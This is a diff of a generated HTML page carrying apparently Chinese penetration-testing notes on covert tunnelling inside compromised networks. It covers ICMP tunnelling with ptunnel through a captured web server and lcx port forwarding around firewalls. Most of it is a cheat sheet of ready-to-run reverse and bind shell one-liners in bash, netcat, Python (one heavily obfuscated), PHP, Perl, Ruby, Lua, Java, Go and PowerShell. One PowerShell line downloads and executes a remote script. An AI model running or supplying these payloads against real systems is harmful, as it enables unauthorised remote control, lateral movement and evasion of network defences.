@@ -485,7 +485,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    11.3k
+                    11.2k
                 </div>
                 
 
@@ -508,10 +508,10 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="内网第三章-隐藏隧道通信技术"><a href="#内网第三章-隐藏隧道通信技术" class="headerlink" title="内网第三章-隐藏隧道通信技术"></a>内网第三章-隐藏隧道通信技术</h1><h2 id="内网连通性判断"><a href="#内网连通性判断" class="headerlink" title="内网连通性判断  "></a><font color="red">内网连通性判断  </font></h2><h4 id="常用判断方法"><a href="#常用判断方法" class="headerlink" title="常用判断方法"></a>常用判断方法</h4><p><strong>1.ICMP协议</strong></p>
-<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ping</span> <span class="token operator">&lt;</span>IP<span class="token operator">&gt;</span>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ping</span> <span class="token operator">&lt;</span>IP<span class="token operator">></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>2.TCP协议</p>
-<pre class="line-numbers language-bash"><code class="language-bash">nc -zv <span class="token operator">&lt;</span>IP<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>port<span class="token operator">&gt;</span>
+<pre class="line-numbers language-bash"><code class="language-bash">nc -zv <span class="token operator">&lt;</span>IP<span class="token operator">></span> <span class="token operator">&lt;</span>port<span class="token operator">></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>3.HTTP协议</p>
 <pre class="line-numbers language-bash"><code class="language-bash">curl ip:port
@@ -558,7 +558,7 @@ curl -x proxy-ip:port  www.baidu.com    <span class="token comment" spellcheck="
 
 <span class="token comment" spellcheck="true">### 使用</span>
 <span class="token comment" spellcheck="true"># 我机器执行</span>
-<span class="token comment" spellcheck="true"># 先关闭本地系统的icmp应答(恢复改为0就行) -&gt; 否则会无限刷屏</span>
+<span class="token comment" spellcheck="true"># 先关闭本地系统的icmp应答(恢复改为0就行) -> 否则会无限刷屏</span>
 sysctl -w net.ipv4.icmp_echo_ignore_all<span class="token operator">=</span>1
 
 ./run.sh  <span class="token comment" spellcheck="true"># 输入目标的公网ip  （此文件好像不对，用下面的py文件吧）</span>
@@ -603,7 +603,7 @@ icmp.exe -t 192.168.1.7 -d 500 -b 30 -s 128  <span class="token comment" spellch
 <span class="token comment" spellcheck="true"># 跳板机器(假设是已获取到的web服务器)：</span>
 ptunnel -x shuteer111
 <span class="token comment" spellcheck="true"># VPS上：</span>
-ptunnel -p <span class="token operator">&lt;</span>跳板_IP<span class="token operator">&gt;</span> -lp 1080 -da <span class="token operator">&lt;</span>另一新目标_IP<span class="token operator">&gt;</span> -dp 3389 -x shuteer111
+ptunnel -p <span class="token operator">&lt;</span>跳板_IP<span class="token operator">></span> -lp 1080 -da <span class="token operator">&lt;</span>另一新目标_IP<span class="token operator">></span> -dp 3389 -x shuteer111
 <span class="token comment" spellcheck="true"># 含义：在访问本地的1080端口时，会把数据库服务器(新目标)的3389数据封装在icmp隧道中，以web服务器为'ICMP隧道跳板'进行传送(窗口会显示是本地的ip，但是实际是另一台数据库服务器的)</span>
 
 <span class="token comment" spellcheck="true">#5.在攻击机器访问本地的1080端口，成功访问到另一台数据库服务器的3389端口</span>
@@ -645,7 +645,7 @@ lcx -listen 4444 33891  <span class="token comment" spellcheck="true"># 将本�
 <p><strong>lcx本地端口映射</strong></p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 如果目标防火墙 限制了部分端口的数据(如3389)，可以进行端口转发：把3389端口的数据转发到防火墙允许的其他端口(如:53)</span>
 <span class="token comment" spellcheck="true"># 在目标主机执行</span>
-lcx -tran 53 <span class="token operator">&lt;</span>目标ip<span class="token operator">&gt;</span>: 3389
+lcx -tran 53 <span class="token operator">&lt;</span>目标ip<span class="token operator">></span>: 3389
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><strong>linux版的portmap</strong></p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 下载地址：http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip</span>
@@ -708,7 +708,7 @@ nc -lvvp 9999
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>文件传输</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 一旦连接建立，数据流就会传入，接收文件</span>
-nc -lp 333 <span class="token operator">&gt;</span>1.txt
+nc -lp 333 <span class="token operator">></span>1.txt
 <span class="token comment" spellcheck="true"># 发送文件内容</span>
 nc -nv 192.168.0.11 <span class="token operator">&lt;</span> test.txt -q 1    <span class="token comment" spellcheck="true">#参数 -q: 输出完成之后过1秒就断开</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
@@ -721,7 +721,7 @@ nc -vn 192.168.0.11 8888
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 参考：https://www.uedbox.com/post/54632</span>
 <span class="token comment" spellcheck="true"># https://www.secpulse.com/archives/76223.html</span>
 
-<span class="token comment" spellcheck="true">##### nc正向shell（正向shell -&gt; 内网服务器之间）</span>
+<span class="token comment" spellcheck="true">##### nc正向shell（正向shell -> 内网服务器之间）</span>
 1.目标主机监听：
 nc -lvvp 4444 -e /bin/bash <span class="token comment" spellcheck="true"># linux</span>
 nc -lvvp 4444 -e c:\\WINDOWS\system32\cmd.exe    <span class="token comment" spellcheck="true"># win</span>
@@ -741,14 +741,14 @@ nc 192.168.0.111 -e c:\\WINDOWS\system32\cmd.exe    <span class="token comment" 
 <span class="token comment" spellcheck="true">###### 如果目标主机没有nc，获取反向shell</span>
 <span class="token comment" spellcheck="true">###### 或者假如nc不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell</span>
 <span class="token comment" spellcheck="true"># bash反弹shell</span>
-/bin/bash -c <span class="token function">bash</span> -i <span class="token operator">&gt;</span><span class="token operator">&amp;</span> /dev/tcp/192.168.41.13/4444 0<span class="token operator">&gt;</span><span class="token operator">&amp;</span>1
+/bin/bash -c <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/192.168.41.13/4444 0<span class="token operator">></span><span class="token operator">&amp;</span>1
 
 <span class="token comment" spellcheck="true"># bash反弹shell(TCP)</span>
-目标机器： <span class="token function">bash</span> -i <span class="token operator">&gt;</span><span class="token operator">&amp;</span> /dev/tcp/192.168.41.133/4444 0<span class="token operator">&gt;</span><span class="token operator">&amp;</span>1
+目标机器： <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/192.168.41.133/4444 0<span class="token operator">></span><span class="token operator">&amp;</span>1
 攻击方： nc -lvvp 4444
 
 <span class="token comment" spellcheck="true"># bash反弹shell(UDP)</span>
-目标机器： <span class="token function">bash</span> -i <span class="token operator">&gt;</span><span class="token operator">&amp;</span> /dev/tcp/192.168.41.133/4444 0<span class="token operator">&gt;</span><span class="token operator">&amp;</span>1
+目标机器： <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/192.168.41.133/4444 0<span class="token operator">></span><span class="token operator">&amp;</span>1
 攻击方监听： nc -u -lvp 4444
 
 
@@ -761,27 +761,27 @@ $ python -c <span class="token string">'import socket,subprocess,os;s=socket.soc
 // 方法二
 $ <span class="token function">export</span> RHOST<span class="token operator">=</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span><span class="token function">export</span> RPORT<span class="token operator">=</span>12345<span class="token punctuation">;</span>python -c <span class="token string">'import sys,socket,os,pty;s=socket.socket();s.connect<span class="token variable"><span class="token punctuation">((</span>os.getenv<span class="token punctuation">(</span>"RHOST"<span class="token punctuation">)</span><span class="token punctuation">,</span>int<span class="token punctuation">(</span>os.getenv<span class="token punctuation">(</span>"RPORT"<span class="token punctuation">))</span></span>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</span>
 <span class="token comment" spellcheck="true"># windows python反弹shell</span>
-C:\Python27\python.exe -c <span class="token string">"(lambda __y, __g, __contextlib: [[[[[[[(s.connect<span class="token variable"><span class="token punctuation">((</span>'<span class="token number">10.11</span>.<span class="token number">0.37</span>'<span class="token punctuation">,</span> <span class="token number">4444</span><span class="token punctuation">))</span></span>, [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [<span class="token variable"><span class="token punctuation">((</span>s.close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> lambda after<span class="token operator">:</span> after<span class="token punctuation">(</span><span class="token punctuation">))</span></span>[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [<span class="token variable"><span class="token punctuation">((</span>p.wait<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>lambda __after<span class="token operator">:</span> __after<span class="token punctuation">(</span><span class="token punctuation">))</span></span>)[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) &gt; 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])<span class="token variable"><span class="token punctuation">((</span>lambda f<span class="token operator">:</span> <span class="token punctuation">(</span>lambda x<span class="token operator">:</span> x<span class="token punctuation">(</span>x<span class="token punctuation">))</span></span>(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"</span>
+C:\Python27\python.exe -c <span class="token string">"(lambda __y, __g, __contextlib: [[[[[[[(s.connect<span class="token variable"><span class="token punctuation">((</span>'<span class="token number">10.11</span>.<span class="token number">0.37</span>'<span class="token punctuation">,</span> <span class="token number">4444</span><span class="token punctuation">))</span></span>, [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [<span class="token variable"><span class="token punctuation">((</span>s.close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> lambda after<span class="token operator">:</span> after<span class="token punctuation">(</span><span class="token punctuation">))</span></span>[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [<span class="token variable"><span class="token punctuation">((</span>p.wait<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>lambda __after<span class="token operator">:</span> __after<span class="token punctuation">(</span><span class="token punctuation">))</span></span>)[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])<span class="token variable"><span class="token punctuation">((</span>lambda f<span class="token operator">:</span> <span class="token punctuation">(</span>lambda x<span class="token operator">:</span> x<span class="token punctuation">(</span>x<span class="token punctuation">))</span></span>(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"</span>
 
 
 
 <span class="token comment" spellcheck="true"># php反向shell</span>
-php -r <span class="token string">'<span class="token variable">$sock</span>=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
+php -r <span class="token string">'<span class="token variable">$sock</span>=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3");'</span>
 
 
 
 <span class="token comment" spellcheck="true"># Perl反向shell</span>
-perl -e <span class="token string">'use Socket;<span class="token variable">$i</span>="10.0.0.1";<span class="token variable">$p</span>=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(<span class="token variable">$p</span>,inet_aton(<span class="token variable">$i</span>)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
+perl -e <span class="token string">'use Socket;<span class="token variable">$i</span>="10.0.0.1";<span class="token variable">$p</span>=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(<span class="token variable">$p</span>,inet_aton(<span class="token variable">$i</span>)))){open(STDIN,">&amp;S");open(STDOUT,">&amp;S");open(STDERR,">&amp;S");exec("/bin/sh -i");};'</span>
 <span class="token comment" spellcheck="true">#</span>
-perl -MIO -e <span class="token string">'<span class="token variable">$p</span>=fork;exit,if(<span class="token variable">$p</span>);<span class="token variable">$c</span>=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN-&gt;fdopen(<span class="token variable">$c</span>,r);$~-&gt;fdopen(<span class="token variable">$c</span>,w);system<span class="token variable">$_</span> while&lt;&gt;;'</span>
+perl -MIO -e <span class="token string">'<span class="token variable">$p</span>=fork;exit,if(<span class="token variable">$p</span>);<span class="token variable">$c</span>=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen(<span class="token variable">$c</span>,r);$~->fdopen(<span class="token variable">$c</span>,w);system<span class="token variable">$_</span> while&lt;>;'</span>
 <span class="token comment" spellcheck="true">#NOTE: Windows only</span>
-perl -MIO -e <span class="token string">'<span class="token variable">$c</span>=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN-&gt;fdopen(<span class="token variable">$c</span>,r);$~-&gt;fdopen(<span class="token variable">$c</span>,w);system<span class="token variable">$_</span> while&lt;&gt;;'</span>
+perl -MIO -e <span class="token string">'<span class="token variable">$c</span>=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen(<span class="token variable">$c</span>,r);$~->fdopen(<span class="token variable">$c</span>,w);system<span class="token variable">$_</span> while&lt;>;'</span>
 
 
 
 
 <span class="token comment" spellcheck="true"># Ruby反向shell</span>
-ruby -rsocket -e<span class="token string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span>
+ruby -rsocket -e<span class="token string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d >&amp;%d 2>&amp;%d",f,f,f)'</span>
 <span class="token comment" spellcheck="true">#不依赖于/bin/sh的反弹shell</span>
 ruby -rsocket -e <span class="token string">'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</span>
 <span class="token comment" spellcheck="true">#如果目标系统运行Windows反弹shell</span>
@@ -791,7 +791,7 @@ ruby -rsocket -e <span class="token string">'c=TCPSocket.new("attackerip","4444"
 
 <span class="token comment" spellcheck="true"># Lua反向shell</span>
 <span class="token comment" spellcheck="true">#Linux</span>
-lua -e <span class="token string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span>
+lua -e <span class="token string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3');"</span>
 <span class="token comment" spellcheck="true">#Windows</span>
 lua5.1 -e <span class="token string">'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, '</span>r<span class="token string">') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'</span>
 
@@ -799,7 +799,7 @@ lua5.1 -e <span class="token string">'local host, port = "127.0.0.1", 4444 local
 
 
 <span class="token comment" spellcheck="true"># Java反弹shell</span>
-r <span class="token operator">=</span> Runtime.getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span> p <span class="token operator">=</span> r.exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span>,<span class="token string">"-c"</span>,<span class="token string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \<span class="token variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="token punctuation">]</span> as String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> p.waitFor<span class="token punctuation">(</span><span class="token punctuation">)</span>
+r <span class="token operator">=</span> Runtime.getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span> p <span class="token operator">=</span> r.exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span>,<span class="token string">"-c"</span>,<span class="token string">"exec 5&lt;>/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \<span class="token variable">$line</span> 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">]</span> as String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> p.waitFor<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
 
 
@@ -810,7 +810,7 @@ socat exec:<span class="token string">'bash -li'</span>,pty,stderr,setsid,sigint
 
 
 <span class="token comment" spellcheck="true"># Golang反弹shell</span>
-<span class="token keyword">echo</span> <span class="token string">'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'</span> <span class="token operator">&gt;</span> /tmp/t.go <span class="token operator">&amp;&amp;</span> go run /tmp/t.go <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> /tmp/t.go
+<span class="token keyword">echo</span> <span class="token string">'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'</span> <span class="token operator">></span> /tmp/t.go <span class="token operator">&amp;&amp;</span> go run /tmp/t.go <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> /tmp/t.go
 
 
 
@@ -871,9 +871,9 @@ ncat -lvvp 777
 
 
 <span class="token comment" spellcheck="true"># Powershell反弹shell</span>
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient<span class="token punctuation">(</span><span class="token string">"[IPADDR]"</span>,<span class="token punctuation">[</span>PORT<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span> <span class="token operator">=</span> <span class="token variable">$client</span>.GetStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span>byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token variable">$bytes</span> <span class="token operator">=</span> 0<span class="token punctuation">..</span>65535<span class="token operator">|</span>%<span class="token punctuation">{</span>0<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token variable"><span class="token punctuation">((</span>$i <span class="token operator">=</span> $stream.Read<span class="token punctuation">(</span>$bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $bytes.Length<span class="token punctuation">))</span></span> -ne 0<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="token punctuation">)</span>.GetString<span class="token punctuation">(</span><span class="token variable">$bytes</span>,0, <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback</span> <span class="token operator">=</span> <span class="token punctuation">(</span>iex <span class="token variable">$data</span> 2<span class="token operator">&gt;</span><span class="token operator">&amp;</span>1 <span class="token operator">|</span> Out-String <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback2</span>  <span class="token operator">=</span> <span class="token variable">$sendback</span> + <span class="token string">"PS "</span> + <span class="token punctuation">(</span>pwd<span class="token punctuation">)</span>.Path + <span class="token string">"&gt; "</span><span class="token punctuation">;</span><span class="token variable">$sendbyte</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>text.encoding<span class="token punctuation">]</span>::ASCII<span class="token punctuation">)</span>.GetBytes<span class="token punctuation">(</span><span class="token variable">$sendback2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span>.Write<span class="token punctuation">(</span><span class="token variable">$sendbyte</span>,0,<span class="token variable">$sendbyte</span>.Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span>.Flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token variable">$client</span>.Close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient<span class="token punctuation">(</span><span class="token string">"[IPADDR]"</span>,<span class="token punctuation">[</span>PORT<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span> <span class="token operator">=</span> <span class="token variable">$client</span>.GetStream<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span>byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token variable">$bytes</span> <span class="token operator">=</span> 0<span class="token punctuation">..</span>65535<span class="token operator">|</span>%<span class="token punctuation">{</span>0<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token variable"><span class="token punctuation">((</span>$i <span class="token operator">=</span> $stream.Read<span class="token punctuation">(</span>$bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $bytes.Length<span class="token punctuation">))</span></span> -ne 0<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="token punctuation">)</span>.GetString<span class="token punctuation">(</span><span class="token variable">$bytes</span>,0, <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback</span> <span class="token operator">=</span> <span class="token punctuation">(</span>iex <span class="token variable">$data</span> 2<span class="token operator">></span><span class="token operator">&amp;</span>1 <span class="token operator">|</span> Out-String <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sendback2</span>  <span class="token operator">=</span> <span class="token variable">$sendback</span> + <span class="token string">"PS "</span> + <span class="token punctuation">(</span>pwd<span class="token punctuation">)</span>.Path + <span class="token string">"> "</span><span class="token punctuation">;</span><span class="token variable">$sendbyte</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>text.encoding<span class="token punctuation">]</span>::ASCII<span class="token punctuation">)</span>.GetBytes<span class="token punctuation">(</span><span class="token variable">$sendback2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span>.Write<span class="token punctuation">(</span><span class="token variable">$sendbyte</span>,0,<span class="token variable">$sendbyte</span>.Length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stream</span>.Flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token variable">$client</span>.Close<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token comment" spellcheck="true"># 或</span>
-powershell -nop -c <span class="token string">"<span class="token variable">$client</span> = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);<span class="token variable">$stream</span> = <span class="token variable">$client</span>.GetStream();[byte[]]<span class="token variable">$bytes</span> = 0..65535|%{0};while<span class="token variable"><span class="token punctuation">((</span>$i <span class="token operator">=</span> $stream.Read<span class="token punctuation">(</span>$bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $bytes.Length<span class="token punctuation">))</span></span> -ne 0){;<span class="token variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="token variable">$bytes</span>,0, <span class="token variable">$i</span>);<span class="token variable">$sendback</span> = (iex <span class="token variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="token variable">$sendback2</span> = <span class="token variable">$sendback</span> + 'PS ' + (pwd).Path + '&gt; ';<span class="token variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="token variable">$sendback2</span>);<span class="token variable">$stream</span>.Write(<span class="token variable">$sendbyte</span>,0,<span class="token variable">$sendbyte</span>.Length);<span class="token variable">$stream</span>.Flush()};<span class="token variable">$client</span>.Close()"</span>
+powershell -nop -c <span class="token string">"<span class="token variable">$client</span> = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);<span class="token variable">$stream</span> = <span class="token variable">$client</span>.GetStream();[byte[]]<span class="token variable">$bytes</span> = 0..65535|%{0};while<span class="token variable"><span class="token punctuation">((</span>$i <span class="token operator">=</span> $stream.Read<span class="token punctuation">(</span>$bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $bytes.Length<span class="token punctuation">))</span></span> -ne 0){;<span class="token variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="token variable">$bytes</span>,0, <span class="token variable">$i</span>);<span class="token variable">$sendback</span> = (iex <span class="token variable">$data</span> 2>&amp;1 | Out-String );<span class="token variable">$sendback2</span> = <span class="token variable">$sendback</span> + 'PS ' + (pwd).Path + '> ';<span class="token variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="token variable">$sendback2</span>);<span class="token variable">$stream</span>.Write(<span class="token variable">$sendbyte</span>,0,<span class="token variable">$sendbyte</span>.Length);<span class="token variable">$stream</span>.Flush()};<span class="token variable">$client</span>.Close()"</span>
 <span class="token comment" spellcheck="true"># 或</span>
 powershell IEX <span class="token punctuation">(</span>New-Object Net.WebClient<span class="token punctuation">)</span>.DownloadString<span class="token punctuation">(</span><span class="token string">'https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1'</span><span class="token punctuation">)</span>
 
@@ -935,9 +935,9 @@ powercat -c 10.10.10.129 -p 9999 -i c:\1.txt -v  <span class="token comment" spe
 
 <span class="token comment" spellcheck="true">##</span>
 <span class="token comment" spellcheck="true"># 客户端生成</span>
-powercat -l -p 8888 -e cme -v -g <span class="token operator">&gt;&gt;</span>shell.ps1   <span class="token comment" spellcheck="true"># 生成反弹shell的脚本</span>
+powercat -l -p 8888 -e cme -v -g <span class="token operator">>></span>shell.ps1   <span class="token comment" spellcheck="true"># 生成反弹shell的脚本</span>
